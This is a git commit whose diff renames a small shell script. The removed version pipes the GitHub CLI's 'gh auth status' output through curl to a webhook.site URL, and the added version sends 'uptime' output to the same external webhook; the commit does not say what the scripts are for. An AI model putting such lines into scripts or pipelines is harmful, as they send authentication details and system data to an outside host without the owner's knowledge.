f6e02af698684825cd1f510d59185b41c97a0bc2
Mauricio <uaxp123@gmail.com>
2021-11-03 02:46:58 -0500

    Update and rename s5.sh to s6.sh

--- s5.sh
+++
@@ -1,4 +0,0 @@
-#!/bin/sh
-
-gh auth status | curl --data-urlencode time@-  https://webhook.site/bee9e625-eb7c-4274-9aaf-76c6f6c88b22?second=
-
---
+++ s6.sh
@@ -0,0 +1,4 @@
+#!/bin/sh
+
+uptime | curl --data-urlencode time@-  https://webhook.site/bee9e625-eb7c-4274-9aaf-76c6f6c88b22?second=
+
